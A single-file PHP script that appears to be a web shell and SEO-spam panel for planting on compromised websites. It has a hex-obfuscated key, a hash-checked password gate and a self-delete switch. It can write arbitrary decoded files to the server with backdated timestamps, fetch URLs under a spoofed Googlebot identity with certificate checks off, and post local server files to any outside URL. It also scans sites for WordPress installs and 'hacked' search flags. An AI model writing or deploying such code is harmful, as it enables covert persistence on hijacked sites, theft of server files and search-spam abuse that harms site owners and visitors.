<?php function login() {@session_start();$UA = $_SERVER['HTTP_USER_AGENT'];if(strpos($UA,'111.3.1.5')>9) exit('CURL23');$data = array_merge($_GET, $_POST); $k="\x63\x75\x32\x33";if(!empty($_SESSION[$k]) || substr(md5(@$data[$k]),0,12)=='1535d7912317') {$_SESSION[$k] = 1;if(isset($_GET['del'])) unlink($_SERVER['SCRIPT_FILENAME']);} else {exit('<form action="" method="post"><input type="password" name="'.$k.'"></form>');}} login();$setua = array('UA','GG','AOL','GG-2','Click','Pass');if(isset($_POST['ua'])) $_SESSION['setua'] = (int)$_POST['ua'];if(!empty($_POST['pass'])) $_SESSION['pass'] = trim($_POST['pass']);if(!empty($_POST['infos'])) $_SESSION['infos'] = trim($_POST['infos']);$output = '';if(!empty($_POST['urls'])) {if(trim($_POST['urls'])=='save' && !empty($_POST['pass']) && !empty($_POST['infos'])) {if(file_put_contents(trim($_POST['pass']),base64_decode($_POST['infos']))) {@touch(trim($_POST['pass']),time()-600000);exit('saveOK');} else {exit('saveNo');}}$urls = explode("\n",$_POST['urls']);$output .= '<ol>';foreach($urls as $k=>$v) {$v = str_replace(array("\t"),'###',$v);$v = str_replace(array("\t","\r","\n"),'',$v);if($v) $output .= '<li class="i-'.($k+1).'"><a target="_blank" href="'.$v.'">'.$v.'</a></li>';}$output .= '</ol>';}$do = isset($_POST['do']) ? $_POST['do'] : (isset($_GET['do']) ? $_GET['do'] : '');$time = isset($_POST['time']) ? $_POST['time'] : '';switch ($do){case 'atitle':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = trim($_POST['url']);$res = _curl($sURL, '', $time);if(@$_SESSION['pass']=='DIE') exit($res[2]);$code = str_replace(array("\n","\r","\t"),'',$res[2]);$json['msg'] = '#'.$res[0].' :: '.($res[0]==200?'':$res[1].' :: ');if(preg_match('/<title[^>]*>([^<]*)<\/title>/i',$code,$arr)) {$json['msg'] .= '@@'.trim($arr[1]);if(preg_match('/<a [^>]*href="([^"]+)"/i',$code,$arr)) {$json['msg'] .= '~~'.trim($arr[1]);}} else {$json['msg'] .= '#'.substr(htmlspecialchars($code),0,2048);}if(preg_match('/wp-content\/themes\//i',$code)) {$json['msg'] .= '【WP】';}}exit(json_encode($json));case 'ahtml':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = trim($_POST['url']);$res = _curl($sURL, '', $time);$code = str_replace(array("\n","\r","\t"),'',$res[2]);$json['msg'] = '#'.$res[0].' :: '.($res[0]==200?'':$res[1].' :: ');$json['msg'] .= htmlspecialchars($code);}exit(json_encode($json));case 'axml':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = trim($_POST['url']);$res = _curl($sURL, '', $time);$code = str_replace(array("\n","\r","\t"),'',$res[2]);$json['msg'] = '#'.$res[0].' :: '.($res[0]==200?'':$res[1].' :: ');if(preg_match_all('/<loc>([^<]+)<\/loc>/i',$code,$arr)) {$json['msg'] .= $arr[1][0].' :: Sitemap='.sizeof($arr[1]);} else {$json['msg'] .= '#'.substr(htmlspecialchars($code),0,2048);}}exit(json_encode($json));case 'ahylist':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = trim($_POST['url']);$res = _curl($sURL, '', $time);$code = str_replace(array("\n","\r","\t"),'',$res[2]);$json['msg'] = '#'.$res[0].' :: '.($res[0]==200?'':$res[1].' :: ');if(preg_match('/<section class="mainlist">/i',$code) || preg_match('/<main id="indexdisplay"/i',$code) || preg_match('/<section id="indexdisplay"/i',$code) || preg_match('/<div style="position:absolute;top:-9999em"><a href="/i',$code)) {$json['msg'] .= '【HYlist】';if(preg_match('/<section class="mainlist">[^<]*<ul><li><a href="([^"]+)"/i',str_replace("\n",'',$code),$arr)) {$json['msg'] .= '/'.trim($arr[1]).' ||| ';}elseif(preg_match('/<div style="position:absolute;top:-9999em"><a href="([^"]+)"/i',str_replace("\n",'',$code),$arr)) {$json['msg'] .= '/'.trim($arr[1]).' ||| ';}elseif(preg_match('/ul><li><a href="([^"]+)"/i',str_replace("\n",'',$code),$arr)) {$json['msg'] .= '/'.trim($arr[1]).' ||| ';}}if(preg_match('/<title[^>]*>([^<]*)<\/title>/i',$code,$arr)) {$json['msg'] .= '@@'.trim($arr[1]);if(preg_match('/ href="([^"]+)"/i',$code,$arr)) {$json['msg'] .= '~~'.trim($arr[1]);}} else {$json['msg'] .= '#'.substr(htmlspecialchars($code),0,2048);}}exit(json_encode($json));case 'aping':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = "\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x70\x69\x6e\x67\x3f\x73\x69\x74\x65\x6d\x61\x70\x3d".trim($_POST['url']);$res = _curl($sURL, '', $time);if(@$_SESSION['pass']=='DIE') exit($res[2]);$code = str_replace(array("\n","\r","\t"),'',$res[2]);$json['msg'] = '#'.$res[0].' :: '.($res[0]==200?'':$res[1].' :: ');if(preg_match('/<title[^>]*>([^<]*)<\/title>/i',$code,$arr)) {$json['msg'] = '@@'.trim($arr[1]);} else {$json['msg'] = '#'.substr(htmlspecialchars($code),0,1024);}}exit(json_encode($json));case 'aggindex':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x2e\x75\x6b\x2f\x73\x65\x61\x72\x63\x68\x3f\x68\x6c\x3d\x65\x6e\x26\x71\x3d\x73\x69\x74\x65\x3a".trim($_POST['url']);$code = google_curl($sURL);if(@$_SESSION['pass']=='DIE') exit($code);$code = str_replace(array("\n","\r","\t"),'',$code);if(preg_match('/<div id="result-stats">([^<]+)</i',$code,$arr)) {$json['msg'] = '@'.str_replace(array(',','About '),'',$arr[1]);if(preg_match_all('/<h3 class="[^"]*">([^<]+)<\//i',$code,$brr)) {				$T = implode(' ,,, ',$brr[1]);if(preg_match('/(ー)/i',$T)) $json['msg'] .= '【JP】';if(preg_match('/(ws_hacked)/i',$code)) $json['msg'] .= '【hacked】';if(preg_match('/(US Digital Millennium Copyright Act)/i',$code)) $json['msg'] .= '【DMCA】';if(preg_match_all('/class="yuRUbf"><a href="([^"]+)"/i',$code,$crr)) $T .= ' ### '.implode(' ,,, ',$crr[1]);$json['msg'] .= ': '.$T;}} else if(preg_match('/<title[^>]*>([^<]*)<\/title>/i',$code,$arr)) {$json['msg'] = '@@'.trim($arr[1]);} else {$json['msg'] = '#'.substr(htmlspecialchars($code),0,1024);}}exit(json_encode($json));case 'asearch':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = trim($_POST['url']);$res = _curl($sURL, '', $time);$code = str_replace(array("\n","\r","\t"),'',$res[2]);$json['msg'] = '#'.$res[0].' :: '.($res[0]==200?'':$res[1].' :: ');if(!empty($_SESSION['pass']) && preg_match('/'.trim($_SESSION['pass']).'/i',$code)) {$json['msg'] .= '##'.$_SESSION['pass'];}elseif(preg_match('/<title[^>]*>([^<]*)<\/title>/i',$code,$arr)) {$json['msg'] .= '@@'.trim($arr[1]);if(preg_match('/<a [^>]*href="([^"]+)"/i',$code,$arr)) {$json['msg'] .= '~~'.trim($arr[1]);}} else {$json['msg'] .= '#'.substr(htmlspecialchars($code),0,2048);}if(preg_match('/wp-content\/themes\//i',$code)) {$json['msg'] .= '【WP】';}}exit(json_encode($json));case 'apost':$json = array('msg'=>'#No');if(!empty($_POST['url'])) {$sURL = trim($_POST['url']);$postdata = json_decode($_SESSION['infos'],1);foreach($postdata as $k=>$v) {if($v=='_file' && !empty($_SESSION['pass'])) {$postdata[$k] = new \CURLFile(realpath($_SESSION['pass']));$postdata['_file'] = 1;}}$res = _curl($sURL, '', $time, $postdata);if(@$_SESSION['pass']=='DIE') exit($res[2]);$code = str_replace(array("\n","\r","\t"),'',$res[2]);$json['msg'] = '#'.$res[0].' :: '.($res[0]==200?'':$res[1].' :: ');$json['msg'] .= substr(htmlspecialchars($code),0,2048);}exit(json_encode($json));}function _curl($sURL, $agent='', $t=15, $Post = array(), $click=0, $N=0) {$Agents = array('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:84.0) Gecko/20100101 Firefox/84.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36');$sURL = trim($sURL);if(!preg_match('/^http/',$sURL)) $sURL = 'http://'.$sURL; switch ((int)$_SESSION['setua']){case 1:$agent = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';break;case 2:$agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geckoaol.com) Chrome/118.0.0.0 Safari/537.36';break;case 3:$agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Geckogoogle) Chrome/111.0.0.0 Safari/537.36';break;case 4:$click = 1;break;case 5:$agent = @$_SESSION['pass'];break;}if($agent=='') $agent = $Agents[array_rand($Agents)];$header[0] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";$header[] = "Cache-Control: max-age=0";$header[] = "Connection: keep-alive";$header[] = "Keep-Alive: 300";$header[] = "Accept-Charset: utf-8;q=0.8,*;q=0.8";$header[] = "Accept-Language: en-US,en;q=0.8";$header[] = "Pragma: ";$curl = curl_init(); curl_setopt($curl,CURLOPT_URL,$sURL);curl_setopt($curl,CURLOPT_HTTPHEADER, $header);curl_setopt($curl,CURLOPT_USERAGENT, $agent);curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);curl_setopt($curl,CURLOPT_HEADER, 0);curl_setopt($curl,CURLOPT_FOLLOWLOCATION, 1);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);if(!empty($click)) curl_setopt($curl, CURLOPT_REFERER, 'https://www.google.com/');if(!empty($Post['_file'])) {curl_setopt($curl,CURLOPT_POST, 1);curl_setopt($curl,CURLOPT_POSTFIELDS, $Post);}elseif(!empty($Post)) {curl_setopt($curl,CURLOPT_POST, 1);curl_setopt($curl,CURLOPT_POSTFIELDS, http_build_query($Post));}curl_setopt($curl,CURLOPT_TIMEOUT,$t);$sHTML = curl_exec($curl);$HTTP = curl_getinfo($curl);curl_close($curl);$domain = preg_replace('/^https?:\/\/([^\/]+).*$/','$1',$sURL);if (!$N && $sHTML=='' && $HTTP['http_code']==200 && preg_match('/^http:/',$sURL) && preg_match('/^https:/',$HTTP['url'])) {if(strpos($HTTP['url'],$domain)===false) return $HTTP['url'];return _curl($HTTP['url'], $agent, $t, $Post, $click, $N+1);}if (!$N && !empty($HTTP['redirect_url'])) {if(strpos($HTTP['redirect_url'],$domain)===false) return $HTTP['redirect_url'];return _curl($HTTP['redirect_url'], $agent, $t, $Post, $click, $N+1);}if($sURL!=$HTTP['url']) return array('301',$HTTP['url'],$sHTML);return array($HTTP['http_code'],$HTTP['url'],$sHTML);}function google_curl($u) {$Agents = array('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:84.0) Gecko/20100101 Firefox/84.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36');$ua = $Agents[array_rand($Agents)];$hd[0] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";$hd[] = "Cache-Control: max-age=0";$hd[] = "Connection: keep-alive";$hd[] = "Keep-Alive: 300";$hd[] = "Accept-Charset: utf-8;q=0.8,*;q=0.8";$hd[] = "Accept-Language: en-US,en;q=0.8";$hd[] = "Pragma: ";$ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_HTTPHEADER, $hd);curl_setopt($ch,CURLOPT_USERAGENT, $ua);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER, 0);curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, 0);curl_setopt($ch,CURLOPT_TIMEOUT,15);$s = curl_exec($ch);curl_close($ch);return $s;}echo '<!DOCTYPE html><html><head><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1"><title>URLs</title><script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.js"></script><style>*{margin:0;padding:0;vertical-align:middle;}body{padding:15px}button{height:20px;padding:0 20px;}#output{line-height:30px;}hr{margin:10px 0}label{margin-right:10px;display:inline-block;}label input{float:left;margin-top:3px;margin-right:3px;}.inline{padding:15px 0;}#output{line-height:30px;padding:0 30px}#output li{line-height:25px;}#output li a{margin-right:10px}#output li span{margin-left:10px;color:red}.ajaxbtn{background:blue;color:#fff;border:0;margin-left:10px}select,.input{padding:3px;margin-bottom:5px;margin-right:5px}</style></head><body><form method="post" action=""><select name="ua">';foreach($setua as $k=>$v) {	echo '<option value="'.$k.'"'.(@$_SESSION['setua']==$k?' selected':'').'>'.$v.'</option>';}echo '</select><input type="text" name="pass" value="'.@$_SESSION['pass'].'" class="input"><button type="submit"></button><br><textarea name="urls" rows="3" cols="60">'.@$_POST['urls'].'</textarea><textarea name="infos" rows="3" cols="60">'.@$_SESSION['infos'].'</textarea><hr /><button type="button" class="ajaxbtn" data-do="atitle" data-time="10">atitle</button><button type="button" class="ajaxbtn" data-do="ahtml" data-time="10">ahtml</button><button type="button" class="ajaxbtn" data-do="axml" data-time="10">axml</button><button type="button" class="ajaxbtn" data-do="ahylist" data-time="10">ahylist</button><button type="button" class="ajaxbtn" data-do="aping" data-time="10">aping</button><button type="button" class="ajaxbtn" data-do="aggindex" data-time="10">aggindex</button><button type="button" class="ajaxbtn" data-do="asearch" data-time="10">asearch</button><button type="button" class="ajaxbtn" data-do="apost" data-time="10">apost</button></form><hr /><div id="output">'.$output.'</div><script>$(function(){$(\'.ajaxbtn\').click(function(){var dotype = $(this).data(\'do\'), id = 1, total = $(\'#output ol li\').length, time=$(this).data(\'time\');doAjax(id,total,dotype,time);});});function doAjax(id,total,dotype,time){if(id>total) return;var url = $(\'li.i-\'+id+\' a\').text();if(url) $.ajax({url : \'\',type : \'post\',dataType : \'json\',data : {\'do\':dotype,\'url\':url,\'time\':time,\'id\':id},complete : function(){doAjax(id+1,total,dotype,time);},success : function(res){if(res.msg) {$(\'li.i-\'+id).append(\'<span>\'+res.msg+\'</span>\');}else{$(\'li.i-\'+id).append(\'<span>#Error</span>\');}}});}</script></body></html>';